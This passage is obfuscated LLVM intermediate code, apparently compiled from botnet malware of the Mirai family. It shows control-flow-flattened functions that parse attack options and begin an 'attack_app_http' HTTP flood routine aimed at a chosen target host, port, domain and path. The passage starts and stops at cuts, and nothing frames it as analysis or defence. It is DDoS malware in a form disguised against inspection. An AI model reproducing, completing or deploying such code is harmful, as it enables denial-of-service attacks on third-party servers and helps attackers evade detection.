  %65 = load %struct.attack_method*, %struct.attack_method** %64, align 8
  %66 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %65, i32 0, i32 0
  %67 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %66, align 8
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %70 = load i8, i8* %11, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %67(i8 zeroext %68, %struct.attack_target* %69, i8 zeroext %70, %struct.attack_option* %71)
  store i32 995600876, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -216055954, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  store i32 515215898, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %73, %72, %60, %47, %41, %40, %31, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 1119827831, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1119827831, label %first
    i32 -831303744, label %9
    i32 -1594616850, label %10
    i32 -483540922, label %11
    i32 -218172734, label %16
    i32 -1111698416, label %25
    i32 1515313111, label %32
    i32 -611656850, label %33
    i32 -701664799, label %36
    i32 839263521, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 -831303744, i32 -1594616850
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 839263521, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -483540922, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 -218172734, i32 -701664799
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 -1111698416, i32 1515313111
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 1515313111, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -611656850, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 -483540922, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 839263521, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1168054619, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1168054619, label %11
    i32 1866566725, label %17
    i32 1331452080, label %29
    i32 -1864840830, label %36
    i32 815473490, label %37
    i32 51740247, label %40
    i32 -1185158452, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 1866566725, i32 51740247
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 1331452080, i32 -1864840830
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 -1185158452, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 815473490, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 -1168054619, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 -1185158452, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1976349527, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1976349527, label %first
    i32 -1661534094, label %18
    i32 -1240825369, label %20
    i32 1084798581, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -1661534094, i32 -1240825369
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 1084798581, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 1084798581, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 66450725, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 66450725, label %first
    i32 -160699451, label %18
    i32 153206058, label %20
    i32 239007205, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -160699451, i32 153206058
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 239007205, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 239007205, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem30 = alloca i32
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  store i8* %84, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1278236146, i32* %switchVar
  %.reg2mem47 = alloca i1
  %.reg2mem49 = alloca i1
  %.reg2mem51 = alloca i1
  %.reg2mem53 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar29 = load i32, i32* %switchVar
  switch i32 %switchVar29, label %switchDefault [
    i32 -1278236146, label %first
    i32 1945281042, label %87
    i32 -1706834010, label %91
    i32 2012669536, label %92
    i32 -2106140191, label %97
    i32 -607435913, label %98
    i32 963786319, label %103
    i32 -43485232, label %104
    i32 -788331343, label %109
    i32 906679249, label %110
    i32 -1099798423, label %111
    i32 -631184951, label %117
    i32 740521438, label %126
    i32 1386078753, label %135
    i32 -1933638179, label %144
    i32 320221669, label %145
    i32 -1139437008, label %148
    i32 -2057765316, label %152
    i32 853599956, label %153
    i32 1505780059, label %158
    i32 547567688, label %163
    i32 -341624541, label %206
    i32 -657179373, label %234
    i32 -144419386, label %271
    i32 -1658450120, label %301
    i32 -991786348, label %NodeBlock27
    i32 -1449653198, label %NodeBlock25
    i32 927056241, label %NodeBlock23
    i32 1780576684, label %NodeBlock21
    i32 968188919, label %LeafBlock19
    i32 -2116971415, label %NodeBlock17
    i32 1543641164, label %NodeBlock15
    i32 764164668, label %NodeBlock13
    i32 -384790996, label %NodeBlock11
    i32 364973715, label %NodeBlock9
    i32 -2037026411, label %NodeBlock7
    i32 -1322681609, label %NodeBlock5
    i32 -857218033, label %NodeBlock3
    i32 1581347151, label %NodeBlock1
    i32 -1687362357, label %NodeBlock
    i32 1995311698, label %LeafBlock
    i32 -808190459, label %320
    i32 -1060419243, label %329
    i32 2023275205, label %338
    i32 -2118928138, label %347
    i32 1280857773, label %356
    i32 314629545, label %365
    i32 670690981, label %374
    i32 1305504577, label %383
    i32 -857134945, label %392
    i32 1481835343, label %401
    i32 -1212435876, label %410
    i32 -1702995761, label %419
    i32 -1538464965, label %428
    i32 413404987, label %437
    i32 1653272550, label %446
    i32 1518247315, label %NewDefault
    i32 1846496582, label %455
    i32 -691582349, label %464
    i32 -591715310, label %467
    i32 1290577000, label %468
    i32 -1408984491, label %471
    i32 -803206422, label %480
    i32 182095538, label %481
    i32 -1380624900, label %490
    i32 943467540, label %491
    i32 1064816525, label %496
    i32 -60083988, label %507
    i32 1711441074, label %513
    i32 -2114140049, label %516
    i32 -951758971, label %519
    i32 -724065063, label %520
    i32 -2054600196, label %527
    i32 698415499, label %534
    i32 1708421551, label %539
    i32 -2121267752, label %545
    i32 -2135939813, label %546
    i32 -7077768, label %604
    i32 1556417977, label %609
    i32 -579544397, label %610
    i32 1714303363, label %617
    i32 1405716272, label %625
    i32 331861880, label %634
    i32 1104300976, label %656
    i32 344295239, label %661
    i32 -343164177, label %662
    i32 1426916451, label %669
    i32 -1978781565, label %782
    i32 -58898630, label %823
    i32 544958860, label %829
    i32 1362190915, label %836
    i32 2083821511, label %843
    i32 -1371885000, label %862
    i32 1418896198, label %865
    i32 297409695, label %872
    i32 -31496982, label %882
    i32 -1750706817, label %890
    i32 2001520035, label %900
    i32 1827581757, label %908
    i32 856550614, label %943
    i32 -553010805, label %948
    i32 -671926338, label %949
    i32 -1825516404, label %956
    i32 2062569925, label %978
    i32 1854128927, label %983
    i32 -1728076269, label %984
    i32 -1078152351, label %991
    i32 523266805, label %1013
    i32 966288890, label %1018
    i32 -1907181179, label %1019
    i32 974876330, label %1026
    i32 -675029337, label %1048
    i32 -1018331988, label %1053
    i32 106474548, label %1054
    i32 1677573524, label %1061
    i32 -178237626, label %1070
    i32 529429631, label %1079
    i32 -235344811, label %1080
    i32 -44814902, label %1081
    i32 1349899923, label %1082
    i32 1640770324, label %1083
    i32 884065732, label %1084
    i32 -190731631, label %1085
    i32 1385476733, label %1086
    i32 -104040203, label %1089
    i32 -1431598495, label %1093
    i32 1928549589, label %1094
    i32 -273657019, label %1104
    i32 989492625, label %1105
    i32 -1888894083, label %1106
    i32 -86179719, label %1111
    i32 -983430407, label %1121
    i32 1724621593, label %1122
    i32 856638087, label %1140
    i32 743776619, label %1149
    i32 -1213396866, label %1153
    i32 1710943846, label %1156
    i32 1549165670, label %1165
    i32 752753341, label %1166
    i32 1429051022, label %1184
    i32 1951529254, label %1191
    i32 1123233221, label %1201
    i32 84172533, label %1210
    i32 777505019, label %1216
    i32 643394728, label %1220
    i32 -2066768816, label %1221
    i32 -733104946, label %1233
    i32 1092573013, label %1236
    i32 -1550597312, label %1243
    i32 -1087713178, label %1246
    i32 -2014489571, label %1255
    i32 -883376399, label %1267
    i32 1961087178, label %1270
    i32 -2136638147, label %1282
    i32 -696517043, label %1289
    i32 1493237770, label %1292
    i32 1647891580, label %1305
    i32 -1278297363, label %1308
    i32 -531188943, label %1309
    i32 2042724362, label %1310
    i32 1813500657, label %1319
    i32 1575436831, label %1331
    i32 856148628, label %1334
    i32 319163185, label %1346
    i32 768199482, label %1353
    i32 -1291156493, label %1356
    i32 -1112440461, label %1369
    i32 1036804630, label %1372
    i32 -662939655, label %1373
    i32 1945940457, label %1374
    i32 2060436116, label %1381
    i32 -324427275, label %1393
    i32 -1097134257, label %1396
    i32 -762707251, label %1408
    i32 1942576320, label %1415
    i32 1196035751, label %1418
    i32 -1904357354, label %1428
    i32 -880186054, label %1429
    i32 -1829695534, label %1432
    i32 1015270821, label %1433
    i32 758041767, label %1443
    i32 -1150498292, label %1448
    i32 -995912489, label %1450
    i32 671198025, label %1467
    i32 -729343463, label %1470
    i32 178008982, label %1487
    i32 1859232578, label %1496
    i32 1259627911, label %1499
    i32 82981095, label %1515
    i32 537554029, label %1530
    i32 -1953793360, label %1538
    i32 1694643462, label %1544
    i32 850109323, label %1553
    i32 -1818165774, label %1554
    i32 512528368, label %1555
    i32 -1534603676, label %1558
    i32 192105540, label %1567
    i32 -2060541597, label %1569
    i32 1364832231, label %1576
    i32 -361756282, label %1588
    i32 1996693482, label %1589
    i32 -552633407, label %1590
    i32 -225494875, label %1593
    i32 841229323, label %1597
    i32 471434170, label %1602
    i32 -626143869, label %1617
    i32 -1294088533, label %1618
    i32 -894808072, label %1619
    i32 -831705551, label %1620
    i32 -2049487952, label %1624
    i32 453959323, label %1631
    i32 516184424, label %1643
    i32 678918961, label %1646
    i32 -760085088, label %1658
    i32 -258314350, label %1665
    i32 -1618230578, label %1668
    i32 -1080806518, label %1681
    i32 543296754, label %1688
    i32 -1160716703, label %1691
    i32 -451400623, label %1701
    i32 -1728798476, label %1710
    i32 578176793, label %1719
    i32 25981587, label %1724
    i32 1398349692, label %1727
    i32 67223197, label %1732
    i32 -1918274431, label %1737
    i32 1585719714, label %1743
    i32 717052143, label %1752
    i32 -496397486, label %1765
    i32 -1897337435, label %1776
    i32 230841318, label %1777
    i32 -556147200, label %1778
    i32 -1596928931, label %1785
    i32 -1001081436, label %1798
    i32 -797585261, label %1807
    i32 1363194391, label %1818
    i32 -1139046325, label %1819
    i32 -1119177753, label %1820
    i32 -840383961, label %1823
    i32 -381807830, label %1824
    i32 -1812240589, label %1831
    i32 1591653033, label %1843
    i32 -675079103, label %1846
    i32 1704916924, label %1858
    i32 648818771, label %1865
    i32 -1103113077, label %1868
    i32 625613023, label %1876
    i32 -1659366523, label %1885
    i32 -955514103, label %1894
    i32 -109099525, label %1902
    i32 -445771968, label %1904
    i32 2144909862, label %1907
    i32 1159495349, label %1916
    i32 -1720379778, label %1931
    i32 -1955541839, label %1934
    i32 -899781440, label %1947
    i32 -2073890462, label %1960
    i32 813681453, label %1969
    i32 -614100921, label %1988
    i32 -1769556528, label %2001
    i32 915227770, label %2002
    i32 -549919443, label %2005
    i32 1734303128, label %2009
    i32 -433374446, label %2013
    i32 1128748432, label %2020
    i32 -443529046, label %2022
    i32 522488022, label %2024
    i32 -582457299, label %2035
    i32 603272675, label %2042
    i32 -1464851589, label %2045
    i32 1439642485, label %2055
    i32 -1234269622, label %2064
    i32 1820171619, label %2073
    i32 328033701, label %2078
    i32 -718670547, label %2081
    i32 307120317, label %2086
    i32 -1391202313, label %2091
    i32 -1484091971, label %2097
    i32 -252761982, label %2106
    i32 -1746169408, label %2119
    i32 814904624, label %2130
    i32 1888094325, label %2131
    i32 1784581483, label %2132
    i32 2133631574, label %2139
    i32 -1003184770, label %2148
    i32 1279491360, label %2161
    i32 1507882174, label %2172
    i32 -853590975, label %2173
    i32 -222931122, label %2174
    i32 -1693680398, label %2175
    i32 -666724380, label %2182
    i32 -670193958, label %2183
    i32 498915131, label %2184
    i32 -1237853288, label %2195
    i32 -1183887003, label %2203
    i32 -1821129394, label %2206
    i32 1620232083, label %2211
    i32 860714842, label %2214
    i32 -276088327, label %2217
    i32 398000236, label %2218
    i32 1826073577, label %2227
    i32 -698361218, label %2234
    i32 -1593413651, label %2235
    i32 2119685316, label %2242
    i32 1852803822, label %2243
    i32 1615649178, label %2249
    i32 -2047198933, label %2261
    i32 1447901388, label %2284
    i32 -1863239706, label %2286
    i32 -394776006, label %2290
    i32 419636586, label %2295
    i32 1112193763, label %2300
    i32 -794131384, label %2309
    i32 -1394950126, label %2310
    i32 -555281403, label %2319
    i32 -1584684784, label %2325
    i32 817285092, label %2334
    i32 -1824664076, label %2338
    i32 -230050385, label %2342
    i32 -772723958, label %2353
    i32 -638514469, label %2364
    i32 -1554429947, label %2397
    i32 -319486367, label %2406
    i32 -519100666, label %2493
    i32 1782133513, label %2498
    i32 -816261079, label %2499
    i32 699213300, label %2500
    i32 1985074841, label %2506
    i32 596308387, label %2512
    i32 -141207081, label %2522
    i32 -1709329567, label %2543
    i32 -1700043646, label %2553
    i32 144198999, label %2561
    i32 -567820323, label %2564
    i32 2136823929, label %2570
    i32 1086450151, label %2571
    i32 -724744725, label %2584
    i32 -1720135153, label %2587
    i32 939585644, label %2588
    i32 1987628545, label %2589
    i32 -708292828, label %2593
    i32 973576685, label %2594
    i32 473402162, label %2625
    i32 816759265, label %2626
    i32 327894863, label %2627
    i32 1187789126, label %2628
    i32 666827440, label %2629
    i32 496072937, label %2630
    i32 -1152556891, label %2637
    i32 -1969078666, label %2638
    i32 794879738, label %2649
    i32 1100810801, label %2651
    i32 -1314307020, label %2655
    i32 1906433785, label %2660
    i32 -570448256, label %2665
    i32 1009530701, label %2674
    i32 1699880013, label %2675
    i32 1235200906, label %2676
    i32 1028883058, label %2683
    i32 -411279089, label %2686
    i32 -1712483427, label %2687
    i32 -1113533947, label %2688
    i32 -1957351390, label %2689
    i32 -1870544277, label %2690
    i32 875992331, label %2691
    i32 1369614598, label %2694
    i32 513180898, label %2695
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %85 = icmp eq i8* %.reload, null
  %86 = select i1 %85, i32 -1706834010, i32 1945281042
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %17, align 8
  %89 = icmp eq i8* %88, null
  %90 = select i1 %89, i32 -1706834010, i32 2012669536
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 513180898, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8*, i8** %17, align 8
  %94 = call i32 @util_strlen(i8* %93)
  %95 = icmp sgt i32 %94, 255
  %96 = select i1 %95, i32 -2106140191, i32 -607435913
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 513180898, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8*, i8** %16, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = icmp sgt i32 %100, 127
  %102 = select i1 %101, i32 963786319, i32 -43485232
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 513180898, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8*, i8** %15, align 8
  %106 = call i32 @util_strlen(i8* %105)
  %107 = icmp sgt i32 %106, 9
  %108 = select i1 %107, i32 -788331343, i32 906679249
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 513180898, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -1099798423, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %10, align 4
  %113 = load i8*, i8** %15, align 8
  %114 = call i32 @util_strlen(i8* %113)
  %115 = icmp slt i32 %112, %114
  %116 = select i1 %115, i32 -631184951, i32 -1139437008
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %15, align 8
  %119 = load i32, i32* %10, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
